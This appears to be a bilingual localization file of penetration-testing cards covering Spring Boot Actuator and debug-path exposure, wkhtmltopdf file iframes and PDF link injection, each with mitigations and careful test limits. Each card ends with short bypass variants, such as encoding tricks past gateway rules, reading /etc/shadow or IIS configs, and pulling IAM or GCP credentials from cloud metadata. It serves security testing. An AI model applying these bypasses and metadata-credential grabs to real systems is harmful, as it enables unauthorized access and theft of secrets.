description.en: Enumerates Spring Boot Actuator management endpoints to verify whether health, configuration, mappings, logs, or diagnostic data are exposed publicly or to low-privilege users.

subCategory.zh: 暴露面与 HTTP 攻击

overview.zh: Spring Boot Actuator 端点暴露针对管理端点被错误公开或授予低权限主体的场景：健康、配置、映射、日志与诊断数据可能泄露。验证 /actuator 系列端点的可达性与数据敏感度。
overview.en: Spring Boot Actuator endpoint exposure targets management endpoints wrongly public or granted to low-privilege principals, where health, config, mapping, log, and diagnostics data may leak. It validates reachability and data sensitivity across the /actuator endpoint family.

vulnerability.zh: 常见根因是把 management 端口发布到公网、使用过宽的 include 配置，或只在反向代理层保护管理路径；环境变量、Bean、映射、日志和堆转储可能泄露密钥、内部拓扑与用户数据，Jolokia 或 loggers 还可能改变运行状态。
vulnerability.en: Common root causes are publishing the management port publicly, overly broad include configuration, or protecting management paths only at the reverse proxy; environment variables, beans, mappings, logs, and heap dumps may leak secrets, internal topology, and user data, while Jolokia or loggers can even change runtime state.

exploitation.zh: 按第 1 步对 /actuator、/actuator/env、/actuator/health、/actuator/info 等清单端点逐条发起 GET/HEAD 并记录认证要求、响应类型和数据敏感度；命中判据为未授权主体获得超出业务需要的数据（环境变量、路由映射、日志级别）。heapdump、threaddump 等高成本端点先获专项批准再测；对照反向代理与直连两种入口，确认保护层是否完整。
exploitation.en: Per step 1, issue GET/HEAD requests against inventory endpoints—/actuator, /actuator/env, /actuator/health, /actuator/info—recording authentication requirements, response types, and data sensitivity; a hit is an unauthorized principal obtaining data beyond business need (environment variables, route mappings, log levels). Get explicit approval before testing costly endpoints like heapdump and threaddump; contrast reverse-proxy versus direct connections to confirm the protection layer is complete.

mitigation.zh: 将管理服务绑定到独立内网接口，默认只暴露 health/info，并对详细健康信息及所有敏感端点实施强认证、细粒度授权和网络访问控制；关闭不需要的 Jolokia、环境、日志和转储功能，轮换已泄露凭据并持续审计访问。修复后重放第 1 步清单，确认敏感端点全部不可达。
mitigation.en: Bind management services to a separate internal interface, expose only health/info by default, and enforce strong authentication, fine-grained authorization, and network controls on detailed health and all sensitive endpoints; disable unneeded Jolokia, env, loggers, and dumps, rotate leaked credentials, and audit access continuously. After the fix, replay the step-1 inventory and confirm all sensitive endpoints are unreachable.

description.zh: 用根路径和普通 404 对照确认 Actuator 路由、版本特征与是否经过独立管理端口。
description.en: Compare the root path with a random 404 to identify Actuator routing, version signals, and any separate management port.

description.zh: 以匿名与低权限会话逐条请求端点，记录认证状态和响应数据类别。
description.en: Request each endpoint under anonymous and low-privilege sessions and record authentication and response-data classification.

description.zh: 只记录最小必要证据，区分公开健康摘要、受保护细节和实际密钥或个人数据暴露。
description.en: Capture the minimum evidence needed and distinguish public health summaries, protected details, and actual secret or personal-data exposure.

description.zh: 收紧端点清单、绑定地址及授权后重放矩阵，确认业务监控保留且未授权敏感响应消失。
description.en: Tighten the endpoint list, bind address, and authorization, then replay the matrix to preserve monitoring while removing unauthorized sensitive responses.

prerequisites.zh: 目标可能运行 Spring Boot 并启用 Actuator
prerequisites.en: The target may run Spring Boot with Actuator enabled.

prerequisites.zh: 测试范围允许对已知管理路径进行低频只读请求
prerequisites.en: The scope permits low-rate read-only requests to known management paths.

analysis.zh: 按端点的可达性、认证要求、数据敏感度和副作用分别评级；公开的简化 health 响应通常不等同于 env、heapdump 或 Jolokia 暴露。
analysis.en: Rate reachability, authentication, data sensitivity, and side effects per endpoint; a minimal public health response is not equivalent to exposed env, heapdump, or Jolokia data.

opsecTips.zh: 默认仅做 GET/HEAD 探测，禁止调用写端点、修改日志级别或触发大体积转储。
opsecTips.en: Default to GET or HEAD discovery and do not invoke write operations, change log levels, or trigger large dumps.

opsecTips.zh: 证据截图和报告中遮盖环境变量、令牌、Cookie 与个人数据。
opsecTips.en: Redact environment variables, tokens, cookies, and personal data from evidence and reports.

description.zh: 利用 Tomcat 分号参数与双斜杠归一化差异，绕过以 /actuator/env 精确匹配的网关规则；成功判据：仍返回环境配置 JSON。
description.en: Exploits Tomcat semicolon-parameter and double-slash normalization to evade exact /actuator/env gateway rules. Success: env config JSON still returns.

description.zh: 路径段编码（含双重编码）规避 ASCII 明文 ACL；成功判据：任一形态返回 200 与配置内容。
description.en: Segment encoding (including double encoding) evades ASCII plaintext ACLs. Success: any form returns 200 with config contents.

description.zh: 换 heapdump/jolokia/自定义管理路径绕过仅封禁 /env 的策略；成功判据：heapdump 可下载或 jolokia 列出 MBean。
description.en: Targets heapdump/jolokia/custom paths to bypass policies sealing only /env. Success: heapdump downloads or jolokia lists MBeans.

name.zh: 调试与版本库端点暴露

description.zh: 检查 Mercurial 元数据以及通用调试、跟踪、指标和映射路径是否被生产路由意外公开。
description.en: Checks whether Mercurial metadata and generic debug, trace, metrics, mapping, or dump paths are accidentally exposed by production routing.

subCategory.zh: 暴露面与 HTTP 攻击

overview.zh: 调试与版本库端点暴露针对部署目录中的版本控制元数据与框架诊断路由被生产公开的场景。验证 /.hg/dirstate 与 /debug、/trace、/health 四类路径的响应内容与认证要求。
overview.en: Debug and repository endpoint exposure targets version-control metadata in deployment directories and framework diagnostic routes published to production. It validates response content and authentication requirements across /.hg/dirstate and the /debug, /trace, /health path classes.

vulnerability.zh: 根因可能是把工作副本直接发布到 Web 根目录，或在生产配置中保留调试与监控处理器；反向代理若只按部分前缀保护路径，框架默认别名仍可能绕过认证并泄露路由、Bean、请求轨迹或内存数据。
vulnerability.en: The root cause may be publishing working copies straight into the web root or keeping debug and monitoring handlers in production configuration; when reverse proxies protect only partial prefixes, framework default aliases can still bypass authentication and leak routes, beans, request traces, or memory data.

exploitation.zh: 按第 1 步逐条请求 /.hg/dirstate、/debug、/trace、/health 并比较状态码、Content-Type、响应签名和认证要求，同时以随机路径排除统一软 404；命中判据为响应包含可用的源码状态、内部结构、运行指标或敏感配置。记录每个路径的暴露层级（应用直返或代理别名）；路径存在但内容为空或错误页时不算命中。
exploitation.en: Per step 1, request /.hg/dirstate, /debug, /trace, and /health one by one, comparing status codes, Content-Type, response signatures, and authentication requirements, with a random path excluding uniform soft 404s; a hit is usable source state, internal structure, run metrics, or sensitive configuration in the response. Record each path's exposure layer (direct app return or proxy alias); paths that exist but return empty content or error pages are not hits.

mitigation.zh: 构建制品时排除 .hg 等版本库目录并在 Web 服务器层显式拒绝隐藏元数据；生产环境关闭调试处理器，将必要监控端点置于独立网络与强认证之后，并用部署后自动扫描阻止这些路径重新出现。修复后重放第 1 步路径，确认全部返回 404/403 且业务静态资源可用。
mitigation.en: Exclude repository directories like .hg from build artifacts and explicitly reject hidden metadata at the web-server layer; disable debug handlers in production, place necessary monitoring endpoints behind separate networks and strong authentication, and run post-deployment scans to stop these paths reappearing. After the fix, replay the step-1 paths and confirm 404/403 across the board while business static assets work.

description.zh: 请求随机不存在路径，记录前端回退、统一错误页和 CDN 缓存特征。
description.en: Request a random nonexistent path and record SPA fallback, uniform error-page, and CDN-cache signatures.

description.zh: 以相同请求头逐条检查版本库与诊断路径，保存状态、媒体类型和最小响应样本。
description.en: Check repository and diagnostic paths with identical headers and retain status, media type, and a minimal response sample.

description.zh: 确认数据来自真实诊断处理器或版本库文件，并判断是否含路由、配置、源码状态或请求信息。
description.en: Confirm that data comes from a real diagnostic handler or repository file and assess routes, configuration, source state, or request data.

description.zh: 清理制品、关闭处理器并收紧代理规则后重放清单，确认返回一致的拒绝或不存在结果。
description.en: Clean the artifact, disable handlers, and tighten proxy rules, then replay the list to confirm consistent denial or absence.

prerequisites.zh: 目标允许对常见诊断路径进行低频只读检查
prerequisites.en: The target permits low-rate read-only checks of common diagnostic paths.

prerequisites.zh: 可将响应与随机不存在路径做对照
prerequisites.en: Responses can be compared with a random nonexistent path.

analysis.zh: 判定重点是响应来源和数据价值。静态前端壳、统一登录页与公开健康摘要应记录为观察项；可下载元数据、内部映射或敏感转储才形成明确风险。
analysis.en: The decisive factors are response provenance and data value. SPA shells, generic login pages, and public health summaries are observations; downloadable metadata, internal mappings, or sensitive dumps create concrete risk.

opsecTips.zh: 不要批量抓取版本库或转储文件，只保留能证明错误发布的最小字节范围。
opsecTips.en: Do not mirror repositories or dump files; retain only the smallest byte range that proves accidental publication.

opsecTips.zh: 对 metrics、trace 和 dump 路径限速，避免给监控服务或应用进程带来额外负载。
opsecTips.en: Rate-limit metrics, trace, and dump checks to avoid unnecessary load on monitoring services or the application process.

description.zh: 扩展 .hg 之外的版本控制泄露路径族，绕过仅覆盖单一路径的拦截；成功判据：任一返回仓库元数据。
description.en: Extends beyond .hg to the full VCS leak family to bypass single-path blocking. Success: any returns repository metadata.

description.zh: 点号与路径段编码规避明文 .git 特征；成功判据：仍能取回 config 内容。
description.en: Encodes dots and segments to evade the plaintext .git signature. Success: config contents still retrievable.

description.zh: 轮换各语言栈调试端点别名，绕过仅覆盖 /debug /trace 的规则；成功判据：任一返回运行时状态或变量。
description.en: Rotates per-stack debug aliases to bypass rules covering only /debug and /trace. Success: any returns runtime state or variables.

name.zh: wkhtmltopdf 脚本化 File Iframe

description.zh: 验证 wkhtmltopdf 执行脚本后动态 iframe 是否能打开渲染沙箱中的 file URI。
description.en: Tests whether a dynamic iframe can open a file URI inside the rendering sandbox after wkhtmltopdf executes script.

overview.zh: wkhtmltopdf 脚本化 File Iframe 针对执行脚本后动态 iframe 能否打开渲染沙箱中 file URI 的场景：脚本能力与文件读取结果需分层记录。验证 document.write 注入 iframe 引用 marker 文件的行为。
overview.en: The wkhtmltopdf scripted file iframe targets whether dynamically written iframes can open file URIs in the rendering sandbox after script execution: script capability and file-read results are recorded in layers. It validates document.write-injected iframes referencing a marker file.

vulnerability.zh: 若不可信脚本能引用宿主 file URI 且本地文件访问被放宽，渲染结果可能包含文件内容；DOM 中出现 URI、文件存在性或加载错误都不是内容泄露证据。
vulnerability.en: If untrusted scripts can reference host file URIs with local file access loosened, rendered output may contain file content; a URI appearing in the DOM, file existence, or load errors are not content-leak evidence.

exploitation.zh: 按第 1 步保留原始行作追溯，实际执行时把 iframe 的 URI 改为临时 marker.txt 并提交到 HTML 转 PDF 入口；命中判据为渲染产物（PDF 文本层）包含 marker 内容，证明脚本化 iframe 能打开 file URI。分层记录：脚本是否执行、iframe 是否创建、本地文件策略是否放行、内容是否可读；读取失败时区分策略拦截与路径不存在。
exploitation.en: Keep the step-1 original for traceability, but change the iframe URI to a temp marker.txt when executing and submit to the HTML-to-PDF entry; a hit is marker content in the rendered artifact (PDF text layer), proving scripted iframes can open file URIs. Record in layers: script execution, iframe creation, local-file policy decision, and content readability; on failure distinguish policy blocks from missing paths.

mitigation.zh: 禁用 JavaScript 和本地文件访问；必须加载本地资产时只暴露规范化资源根，并以无宿主挂载权限身份运行渲染器。修复后重放第 1 步脚本化 iframe，确认 file URI 打开被拒绝且正常渲染可用。
mitigation.en: Disable JavaScript and local file access; when local assets are required expose only a normalized resource root and run the renderer without host-mount permissions. After the fix, replay the step-1 scripted iframe and confirm file-URI opens are rejected while normal rendering works.

description.zh: 创建随机 marker 和缺失路径，并记录禁用 JavaScript 的零读取结果。
description.en: Create a random marker and missing path and record a zero-read result with JavaScript disabled.

description.zh: 只运行一次动态 iframe，保存文件审计与输出哈希。
description.en: Run the dynamic iframe once and preserve file audit and output hash.

title.zh: 确认 Marker 内容读取

description.zh: 匹配 wkhtmltopdf PID 的 read 和输出随机值，排除仅 open 或错误。
description.en: Match the wkhtmltopdf PID's read with the random output value and exclude open-only events or errors.

description.zh: 修复后 marker 在打开前失败，再删除临时目录、Profile 和 PDF。
description.en: After remediation make the marker fail before open, then delete the temporary directory, profile, and PDF.

prerequisites.zh: 原系统路径改为只含随机文本的沙箱 marker 文件，且工作目录外文件不可见
prerequisites.en: The original system path is changed to a random-text sandbox marker file and files outside the working directory are invisible.

prerequisites.zh: 文件审计和 JavaScript 对照可区分动态节点创建、打开尝试和实际读取
prerequisites.en: File audit and JavaScript controls distinguish dynamic-node creation, open attempts, and actual reads.

analysis.zh: 只有渲染进程读取 marker 字节并使随机值进入输出，才证明本地文件内容可达。脚本执行本身或 iframe 创建只说明到达前置条件。
analysis.en: Local-file content is reachable only when the renderer reads marker bytes and the random value enters output. Script execution or iframe creation alone establishes only prerequisites.

opsecTips.zh: 只创建无敏感单行 marker，容器内不挂载系统目录、用户目录或应用密钥
opsecTips.en: Create only a nonsensitive one-line marker and mount no system directories, user directories, or application keys in the container.

opsecTips.zh: 文件读取限制为单文件和极小字节数，首次 read 后立即终止渲染
opsecTips.en: Limit file access to one file and very few bytes and terminate rendering immediately after the first read.

description.zh: 换目标为 shadow。判据：PDF 含哈希或错误回显。
description.en: Targets shadow instead. Success: hashes or error in PDF.

description.zh: 目标由 hash 动态传入绕过静态检测。判据：可控读取任意文件。
description.en: Target supplied via the hash fragment. Success: arbitrary file read.

description.zh: srcdoc 内嵌 iframe 双层绕过。判据：内容渲染。
description.en: Nested frame inside srcdoc. Success: content rendered.

name.zh: PDF 外部 HTTPS 诱导链接

description.zh: 使用一个外部 HTTPS 锚点验证 HTML 转 PDF 流程是否把不受信链接保留为可点击 PDF 注释，以及查看器如何展示目标来源。
description.en: Uses one external HTTPS anchor to test whether an HTML-to-PDF flow preserves an untrusted link as a clickable PDF annotation and how the viewer displays its destination origin.

subCategory.zh: 文档活动内容与公式注入

overview.zh: PDF 外部 HTTPS 诱导链接针对 HTML 转 PDF 流程把不受信链接保留为可点击注释的场景：查看器如何展示目标来源决定诱导风险。验证外部 HTTPS 锚点的链接保留与来源提示。
overview.en: The PDF external HTTPS lure link targets HTML-to-PDF flows preserving untrusted links as clickable annotations: how viewers present the target source determines lure risk. It validates link preservation and source presentation of an external HTTPS anchor.

vulnerability.zh: 若应用允许攻击者控制链接目标或用可信显示文本掩盖外部来源，接收者可能被诱导离开受信文档；风险依赖链接被保留、查看器展示不足和用户点击，不能分类为 SSRF。
vulnerability.en: If the application lets attackers control link targets or mask external sources with trusted display text, recipients can be lured away from trusted documents; risk depends on link preservation, insufficient viewer presentation, and user clicks—it must not be classified as SSRF.

exploitation.zh: 按第 1 步把外部 HTTPS 锚点写入 HTML 转 PDF 入口接受的输入，生成前把原域替换为自有空白测试域；命中判据为生成的 PDF 保留可点击链接注释且目标指向测试域。检查链接目标与可见文本是否一致、查看器是否显示来源提示；验证不进行凭证采集，也不自动访问外部站点，仅以注释结构证明链接被保留。
exploitation.en: Write the external HTTPS anchor into input the HTML-to-PDF entry accepts per step 1, replacing the original domain with your own blank test domain before generation; a hit is the generated PDF keeping a clickable link annotation targeting the test domain. Check whether link target and visible text match and whether the viewer presents source hints; no credential harvesting and no automatic visits—prove only link preservation via annotation structure.

mitigation.zh: 服务端只允许批准 scheme/host，重写或移除外部链接并在文档中显示规范化目标；对用户生成 PDF 增加明显来源提示。修复后重放第 1 步锚点，确认外部目标被阻断或重写且站内链接可用。
mitigation.en: Allow only approved schemes/hosts server-side, rewriting or removing external links and displaying normalized targets in the document; add clear source hints to user-generated PDFs. After the fix, replay the step-1 anchor and confirm external targets are blocked or rewritten while internal links work.

title.zh: 建立无链接 PDF 基线

description.zh: 记录生成器版本、输入 HTML、输出注释数量和查看器安全设置。
description.en: Record generator version, input HTML, output annotation count, and viewer security settings.

title.en: Replace with a controlled domain and generate

description.zh: 保持锚点结构，只替换域名，生成一次并离线检查链接对象。
description.en: Preserve the anchor structure, replace only the domain, generate once, and inspect the link object offline.

description.zh: 在隔离查看器手动点击，记录提示与目标；确认生成服务器没有网络请求。
description.en: Click manually in an isolated viewer, record prompts and destination, and confirm the generation server made no network request.

title.en: Clean the document and test domain

description.zh: 删除 PDF 和测试路由，应用链接策略后重放站内/外部对照。
description.en: Delete the PDF and test route and replay internal and external controls after applying link policy.

prerequisites.zh: 使用隔离 PDF 生成器和自有无内容 HTTPS 测试域，能够检查输出注释对象
prerequisites.en: An isolated PDF generator and controlled empty HTTPS test domain are used, and output annotation objects can be inspected.

prerequisites.zh: 测试查看器关闭自动导航，操作者可观察链接提示、显示文本与实际 URI
prerequisites.en: The test viewer has automatic navigation disabled, and the operator can observe link prompts, displayed text, and the actual URI.

analysis.zh: 确认范围仅是 PDF 中保留了可点击外部链接并可能诱导用户。没有用户点击和查看器导航就没有访问；生成器未发起请求，因此不能将内含 URL 或注释对象误报为 SSRF。
analysis.en: The confirmed scope is limited to a clickable external link preserved in a PDF that may lure a user. Without a user click and viewer navigation there is no visit; because the generator makes no request, a URL or annotation object must not be reported as SSRF.

opsecTips.zh: 只使用自有空白域且禁止表单、Cookie、重定向和分析脚本；一次手动点击后停止
opsecTips.en: Use only a controlled blank domain with no forms, cookies, redirects, or analytics and stop after one manual click.

opsecTips.zh: 测试后删除输出 PDF、浏览历史和测试域访问日志中的唯一令牌
opsecTips.en: After testing delete the output PDF, browsing history, and unique tokens from test-domain access logs.

description.zh: 以表单按钮诱导外连。判据：GET 到达攻击域。
description.en: Form button lure. Success: GET reaches the attacker host.

description.zh: 打开即回连确认。判据：像素请求到达。
description.en: Open confirmation beacon. Success: pixel request arrives.

description.zh: 直接写 PDF 对象层 URI 动作。判据：点击触发访问。
description.en: Object-level URI action. Success: visit on click.

name.zh: PDF JavaScript URI 动作边界

description.zh: 使用 javascript: 锚点测试转换器是否把脚本 scheme 保留为 PDF URI/动作，以及隔离查看器是否执行简单提示。
description.en: Uses a javascript: anchor to test whether a converter preserves the script scheme as a PDF URI or action and whether an isolated viewer executes a simple alert.

subCategory.zh: 文档活动内容与公式注入

overview.zh: PDF JavaScript URI 动作边界针对转换器把 javascript: scheme 保留为 PDF URI/动作的场景：HTML 锚点与 PDF 动作并非同一规范对象。验证脚本 scheme 锚点的转换结果与隔离查看器执行边界。
overview.en: The PDF JavaScript-URI action boundary targets converters preserving the javascript: scheme as PDF URI/action: HTML anchors and PDF actions are not the same specification object. It validates conversion of script-scheme anchors and execution boundaries in an isolated viewer.

vulnerability.zh: 若不可信 HTML 可生成主动 PDF 内容，查看器策略或用户信任可能允许脚本交互；常量 alert 成功只证明活动内容执行，不证明 Cookie、文件、网络访问或浏览器 XSS。
vulnerability.en: If untrusted HTML can produce active PDF content, viewer policy or user trust may permit script interaction; a constant alert succeeding only proves active-content execution, not cookie, file, or network access nor browser XSS.

exploitation.zh: 按第 1 步把 javascript:app.alert(1) 锚点写入转换入口接受的输入并生成 PDF；生成后先离线检查 scheme/动作是否保留，再在隔离查看器中手动激活一次；命中判据为查看器执行简单提示（弹出 alert 或对应事件日志）。记录转换器的处理方式（删除、保留为普通 URI 或映射为动作）与查看器策略；不扩展脚本，不在常用工作站打开。
exploitation.en: Per step 1, write the javascript:app.alert(1) anchor into input the conversion entry accepts and generate the PDF; after generation, inspect offline whether the scheme/action survived, then manually activate once in an isolated viewer; a hit is the viewer executing the simple prompt (an alert popup or corresponding event log). Record how the converter handled it (deleted, kept as plain URI, or mapped to action) and the viewer policy; do not extend the script and never open on workstations.

mitigation.zh: 转换前拒绝非 http/https/站内 scheme，生成后清除 JavaScript、Launch、URI 等非批准动作，并采用默认禁用活动内容的查看器策略。修复后重放第 1 步锚点，确认脚本 scheme 被移除且 PDF 无活动动作。
mitigation.en: Reject non-http/https/internal schemes before conversion, strip JavaScript, Launch, URI, and other unapproved actions after generation, and adopt viewer policy disabling active content by default. After the fix, replay the step-1 anchor and confirm script schemes are removed with no active actions left in the PDF.

title.zh: 离线检查 PDF 动作基线
title.en: Inspect the PDF action baseline offline

description.zh: 生成空链接与普通链接对照并枚举输出动作，不执行任何内容。
description.en: Generate no-link and ordinary-link controls and enumerate output actions without execution.

description.zh: 提交原锚点一次并保存输入、输出哈希与动作字典。
description.en: Submit the original anchor once and preserve input, output hash, and action dictionary.

description.zh: 手动点击并只记录常量提示、查看器版本和策略，不授予额外权限。
description.en: Click manually and record only the constant prompt, viewer version, and policy without granting extra permissions.

description.zh: 应用 scheme/动作清理后重新生成，确认普通链接保留而脚本动作消失。
description.en: After scheme and action sanitization regenerate to preserve ordinary links while removing script actions.

prerequisites.zh: 输出 PDF 可离线检查动作字典，测试查看器运行在无网络、无本地文件权限的沙箱
prerequisites.en: Output action dictionaries can be inspected offline and the test viewer runs in a sandbox without network or local-file access.

prerequisites.zh: 只允许原始 app.alert 常量提示，不添加文档数据读取、提交或持久动作
prerequisites.en: Only the original constant app.alert prompt is allowed, with no document-data read, submission, or persistent action.

analysis.zh: 最强证据是特定 PDF 查看器执行被转换后的常量动作。若转换器删除 scheme、只创建不可执行 URI、查看器拦截或仅弹警告，则不是脚本执行；结果也不能外推到其他查看器。
analysis.en: The strongest evidence is a specific PDF viewer executing the converted constant action. If the converter removes the scheme, creates only a nonexecuting URI, or the viewer blocks or merely warns, script execution is unproven and cannot be generalized to other viewers.

opsecTips.zh: 查看器断网并使用空白临时 Profile，只允许一次 app.alert，禁止访问文档字段或主机 API
opsecTips.en: Run the viewer offline with an empty temporary profile and allow one app.alert only, with no document-field or host-API access.

opsecTips.zh: 验证后销毁查看器 Profile、PDF、动作导出和截图中的测试标识
opsecTips.en: After validation destroy the viewer profile, PDF, action export, and test identifiers in screenshots.

description.zh: JS URI 内调用 launchURL。判据：浏览器打开攻击域。
description.en: JS URI calling launchURL. Success: browser opens the attacker host.

description.zh: JS URI 内提交表单。判据：请求到达。
description.en: JS URI submitting a form. Success: request arrives.

description.zh: 直接注入 PDF 动作对象。判据：打开执行。
description.en: Raw PDF action object. Success: executes on open.

name.zh: PDF 本地 File URI 链接

description.zh: 使用 file:///etc/passwd 锚点验证转换器是否保留本地文件 URI，以及 PDF 查看器在用户激活时的 scheme 与文件权限策略。
description.en: Uses a file:///etc/passwd anchor to test whether the converter preserves a local-file URI and how PDF viewer scheme and filesystem policy behave on user activation.

overview.zh: PDF 本地 File URI 链接针对转换器保留本地文件 URI 及查看器在用户激活时的 scheme 与文件权限策略的场景。验证 file:/// 锚点的链接保留与点击行为，实际路径替换为沙箱 marker。
overview.en: The PDF local file-URI link targets converter preservation of local file URIs and viewer scheme/file-permission policy on user activation. It validates link preservation and click behavior of a file:/// anchor, with the actual path swapped for a sandbox marker.

vulnerability.zh: 若查看器对不可信文档放宽本地文件链接，用户点击可能暴露路径存在性或打开本地资源；仅保留 URI、出现安全提示或打开失败都不等于文件内容泄露。
vulnerability.en: If viewers loosen local file links for untrusted documents, user clicks can expose path existence or open local resources; URI preservation alone, security prompts, or failed opens do not equal content leakage.

exploitation.zh: 保持第 1 步原行用于追溯，实际生成时把路径改为沙箱 marker.txt 并提交转换入口；命中判据为生成的 PDF 保留本地文件 URI 链接注释，且在隔离查看器中点击触发 scheme 校验提示或打开行为。记录查看器对 file scheme 的策略与提示文案；验证仅到注释结构与点击反馈层面，不读取任何宿主文件内容。
exploitation.en: Keep the step-1 original for traceability, but swap the path to a sandbox marker.txt when generating and submit to the conversion entry; a hit is the generated PDF keeping a local file-URI link annotation, with clicks in an isolated viewer triggering scheme-validation prompts or open behavior. Record the viewer's file-scheme policy and prompt text; validation stays at annotation structure and click feedback—never read host file content.

mitigation.zh: 转换前拒绝 file scheme，生成后移除本地 URI 动作；查看器默认阻断不可信文档访问本地文件，并把业务附件通过受控对象 ID 提供。修复后重放第 1 步锚点，确认本地 URI 被移除且正常链接可用。
mitigation.en: Reject file schemes before conversion and remove local URI actions after generation; viewers block untrusted documents from accessing local files by default, serving business attachments via controlled object IDs. After the fix, replay the step-1 anchor and confirm local URIs are removed while normal links work.

description.zh: 文件只含随机常量，路径位于临时挂载且文件审计开启。
description.en: The file contains only a random constant in a temporary mount with file auditing enabled.

title.en: Replace the path and generate the PDF

description.zh: 只改 href 路径，保存输出哈希并检查生成器没有文件读取。
description.en: Change only the href path, preserve the output hash, and verify the generator performed no file read.

description.zh: 记录提示、文件调用和标记可见性，区分链接激活与内容泄露。
description.en: Record prompts, file calls, and marker visibility and distinguish link activation from content disclosure.

title.zh: 阻断 File URI 并清理
title.en: Block file URIs and clean up

description.zh: 修复后重放普通 HTTPS 与 file 对照，随后删除 PDF、标记文件和审计导出。
description.en: After remediation replay ordinary HTTPS and file controls, then delete the PDF, marker file, and audit export.

prerequisites.zh: 原系统路径在验证前替换为沙箱内只含随机标记的文件
prerequisites.en: The original system path is replaced before validation with a sandbox file containing only a random marker.

prerequisites.zh: 查看器以无宿主文件权限身份运行，能够记录 URI 激活、提示与实际文件调用
prerequisites.en: The viewer runs without host-file privileges and can record URI activation, prompts, and actual file calls.

analysis.zh: 该条只能证明 PDF 客户端对本地 file URI 的处理。生成器无文件事件时不是服务端文件读取；查看器仅提示或尝试打开也不等于内容泄露，必须看到沙箱标记或等价审计证据。
analysis.en: This entry proves only client-side PDF handling of a local file URI. With no generator file event it is not a server-side read, and a viewer prompt or open attempt is not disclosure without the sandbox marker or equivalent audit evidence.

opsecTips.zh: 只指向临时标记文件并以无宿主挂载权限查看；首次文件调用后立即停止
opsecTips.en: Point only to the temporary marker and view without host-mount privileges; stop after the first file call.

opsecTips.zh: 测试后卸载沙箱目录、删除 PDF 和查看器最近文件记录
opsecTips.en: After testing unmount the sandbox directory and delete the PDF and viewer recent-file records.

description.zh: 换 Windows 目标。判据：点击读取 win.ini。
description.en: Windows target. Success: win.ini read on click.

description.zh: 读取进程环境变量。判据：变量内容暴露。
description.en: Reads process env. Success: env contents exposed.

description.zh: 读取 IIS 配置。判据：连接串泄露。
description.en: Reads IIS config. Success: connection string leaked.

name.zh: PDF 元数据地址 HTTP 链接

description.zh: 使用指向 169.254.169.254 的锚点验证 PDF 是否保留特殊地址链接及客户端点击策略，并明确它不是渲染器 SSRF。
description.en: Uses an anchor targeting 169.254.169.254 to test PDF preservation and client click policy for a special-address link while explicitly distinguishing it from renderer SSRF.

subCategory.zh: 文档活动内容与公式注入

overview.zh: PDF 元数据地址 HTTP 链接针对 PDF 保留指向云元数据地址的链接及客户端点击策略的场景：生成时不抓取目标，请求源由网络日志判定。验证 169.254 地址锚点的注释保留行为。
overview.en: The PDF metadata-address HTTP link targets PDFs retaining links to cloud metadata addresses and client click policy: generation does not fetch the target—the request source is judged by network logs. It validates annotation preservation of a 169.254 address anchor.

vulnerability.zh: 不可信 PDF 若能引导用户访问客户端可达的链路本地服务，可能触发本地交互；这依赖点击和客户端网络。只有生成服务自动请求该目标时才属于 SSRF，而本卡不假设该行为。
vulnerability.en: If untrusted PDFs can lead users to client-reachable link-local services, local interaction may trigger; this depends on clicks and client networking. It is SSRF only when the generation service automatically requests the target—this card assumes no such behavior.

exploitation.zh: 按第 1 步把元数据 HTTP 锚点写入转换入口接受的输入，实际测试替换为隔离模拟地址并只检查注释与手动导航；命中判据为生成的 PDF 保留指向特殊地址的可点击链接注释。记录查看器对特殊地址的展示与阻断提示；同时在生成服务侧的网络日志确认没有任何自动请求，以区分纯诱导链接与真实 SSRF。
exploitation.en: Per step 1, write the metadata HTTP anchor into input the conversion entry accepts, swapping in an isolated mock address for actual tests and checking only annotations and manual navigation; a hit is the generated PDF keeping a clickable link annotation toward the special address. Record viewer presentation and blocking hints for special addresses; simultaneously confirm zero automatic requests in generation-service network logs to separate pure lure links from real SSRF.

mitigation.zh: 移除或重写指向回环、链路本地、私网和保留地址的 PDF 链接，查看器对特殊地址显示阻断提示；对确需链接的业务使用批准域映射。修复后重放第 1 步锚点，确认特殊地址链接被移除或重写且正常外链可用。
mitigation.en: Remove or rewrite PDF links pointing at loopback, link-local, private, and reserved addresses, with viewers showing blocking hints for special addresses; use approved-domain mapping for business-required links. After the fix, replay the step-1 anchor and confirm special-address links are removed or rewritten while normal external links work.

title.zh: 分离生成器与查看器网络

description.zh: 为两个组件设置独立日志和出口，部署只返回随机标记的模拟端点。
description.en: Configure separate logs and egress for both components and deploy a simulator returning only a random marker.

title.en: Rewrite the address and generate the document

description.zh: 替换真实元数据地址，生成一次并检查注释及服务器零请求基线。
description.en: Replace the real metadata address, generate once, and inspect the annotation and server zero-request baseline.

title.zh: 手动点击并确认客户端来源
title.en: Click manually and confirm client origin

description.zh: 只允许一次查看器请求，匹配标记、来源和时间，禁止重定向。
description.en: Allow one viewer request only and match marker, source, and time with redirects disabled.

description.zh: 修复后生成并点击对照，确认普通批准域可用而模拟链路本地地址被阻断。
description.en: After remediation generate and click controls to preserve approved domains while blocking the simulated link-local destination.

prerequisites.zh: 禁止访问真实 169.254.169.254，链接在生成前改为隔离链路本地模拟服务
prerequisites.en: Access to real 169.254.169.254 is prohibited and the link is changed before generation to an isolated link-local simulation service.

prerequisites.zh: 生成器和查看器网络分别可观测，可区分服务端自动请求与客户端手动点击
prerequisites.en: Generator and viewer networks are observed separately so server-side automatic requests can be distinguished from a client-side manual click.

analysis.zh: 网络来源决定结论：只有 PDF 查看器点击产生请求时，这是客户端链接行为；生成服务器自动抓取才是 SSRF。链接中出现 169.254.169.254、查看器预览 URL 或无响应均不能单独证明任何一类访问。
analysis.en: Request origin determines the conclusion: a request produced only by a viewer click is client-link behavior, while automatic generation-server retrieval is SSRF. The literal 169.254.169.254, a URL preview, or no response proves neither access class by itself.

opsecTips.zh: 绝不连接真实云元数据；模拟端点无凭证、无重定向且单次响应后关闭
opsecTips.en: Never connect to real cloud metadata; the simulator has no credentials or redirects and closes after one response.

opsecTips.zh: 验证后删除 PDF、模拟端点、查看器缓存和网络日志中的令牌
opsecTips.en: After validation delete the PDF, simulator, viewer cache, and tokens from network logs.

description.zh: 深入 IAM 端点取临时凭据。判据：返回角色凭据 JSON。
description.en: Deeper IAM path for temporary credentials. Success: role credential JSON returned.

description.zh: 换云厂商地址绕过单 IP 封禁。判据：返回元数据。
description.en: Different cloud provider address. Success: metadata returned.

description.zh: GCP 服务账号 token。判据：返回 token。
description.en: GCP service-account token. Success: token returned.

name.zh: Shell 分词与路径通配混淆
name.en: Shell Tokenization and Path Globbing Obfuscation

